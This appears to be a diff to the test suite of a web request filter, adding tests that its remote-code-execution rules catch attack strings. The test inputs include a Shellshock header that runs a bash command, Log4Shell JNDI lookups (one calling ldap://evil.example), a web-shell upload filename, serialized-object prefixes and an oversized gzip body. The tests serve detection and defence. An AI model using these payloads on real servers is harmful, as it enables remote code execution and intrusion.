@@ -56,12 +56,15 @@ class PolicyTests(unittest.TestCase):
             self.assertIsNone(inspect_wsgi_request(request, SQLInjectionPolicy(mode='monitor', max_bytes=16)))
         self.assertEqual(request.stream.read(), raw)
 
-    def test_multipart_is_not_read(self):
-        class Unreadable:
-            def read(self, *_):
-                raise AssertionError('Upload stream consumed')
-        request = SimpleNamespace(query_string=b'', content_type='multipart/form-data; boundary=x', stream=Unreadable())
-        self.assertIsNone(inspect_wsgi_request(request, SQLInjectionPolicy()))
+    def test_multipart_is_read_by_its_start_and_replayed_whole(self):
+        import io
+        raw = b'--x\r\nContent-Disposition: form-data; name="f"; filename="a.txt"\r\n\r\n' + b'ordinary ' * 20000 + b'\r\n--x--\r\n'
+        request = SimpleNamespace(query_string=b'q=1', content_type='multipart/form-data; boundary=x', stream=io.BytesIO(raw))
+        self.assertIsNone(inspect_wsgi_request(request, SQLInjectionPolicy(max_bytes=4096)))
+        self.assertEqual(request.stream.read(), raw)
+        attack = b'--x\r\nContent-Disposition: form-data; name="f"; filename="shell.jsp"\r\n\r\nx\r\n--x--\r\n'
+        request = SimpleNamespace(query_string=b'', content_type='multipart/form-data; boundary=x', stream=io.BytesIO(attack))
+        self.assertEqual(inspect_wsgi_request(request, SQLInjectionPolicy()).rule, 'rce_script_upload')
 
     def test_asgi_chunk_replay_including_monitor_overflow(self):
         async def exercise(mode, max_bytes):
@@ -212,3 +215,38 @@ def test_xml_bodies_are_inspected():
     assert _sql.inspectable_content_type("application/soap+xml")
     policy = _sql.SQLInjectionPolicy("block")
     assert policy.inspect(None, b'<?xml version="1.0"?><root><a probe="1234 OR 1=1"></a></root>').rule == "sql_breakout_numeric"
+
+
+_RCE = _json.loads((_FIXTURES / "rce_cases.json").read_text(encoding="utf-8"))
+
+
+def test_remote_code_execution_is_found_in_bodies_headers_and_paths():
+    policy = _sql.SQLInjectionPolicy("block")
+    for value, rule in _RCE["attacks"]:
+        assert policy.inspect(body={"field": value}) == _sql.Finding(rule), value
+    found = [(value, policy.inspect(body={"field": value})) for value in _RCE["ordinary"] + _ORDINARY]
+    assert [value for value, finding in found if finding and finding.rule.startswith("rce_")] == []
+    # User-Agent and Accept aren't checked for SQL, but they carry Log4Shell and Shellshock.
+    assert policy.inspect_headers([("User-Agent", "() { :; }; /bin/bash -c id")]) == _sql.Finding("rce_shellshock")
+    assert policy.inspect_headers([("Accept", "${${lower:j}ndi:ldap://x/a}")]) == _sql.Finding("rce_jndi_lookup")
+    assert policy.inspect_headers([("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")]) is None
+    assert policy.inspect_path("/files/%24%7Bjndi%3Aldap%3A%2F%2Fx%7D") == _sql.Finding("rce_jndi_lookup")
+    assert _sql.SQLInjectionPolicy("off").inspect(body={"field": "${jndi:ldap://x}"}) is None
+
+
+def test_form_fields_json_keys_binary_and_gzip_bodies_are_checked():
+    import gzip
+
+    policy = _sql.SQLInjectionPolicy("block")
+    for value, rule in _RCE["form_attacks"]:
+        assert policy.inspect(body=value.encode()) == _sql.Finding(rule), value
+        assert policy.inspect(query=value.encode()) == _sql.Finding(rule), value
+    for value, rule in _RCE["json_attacks"]:
+        assert policy.inspect(body=value.encode()) == _sql.Finding(rule), value
+    for value in _RCE["ordinary_forms"] + _RCE["ordinary_json"]:
+        assert policy.inspect(body=value.encode()) is None, value
+    # Raw binary objects, which aren't text, and gzip bodies, which are read inflated.
+    assert policy.inspect(body=b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap").rule == "rce_serialized_object"
+    assert policy.inspect(body=b"\x80\x04\x95\x1f\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix").rule == "rce_serialized_object"
+    assert policy.inspect(body=gzip.compress(b'{"q": "${jndi:ldap://evil.example/a}"}')).rule == "rce_jndi_lookup"
+    assert policy.inspect(body=gzip.compress(b"a" * (10 << 20))) == _sql.Finding("payload_inspection_limit", 413)
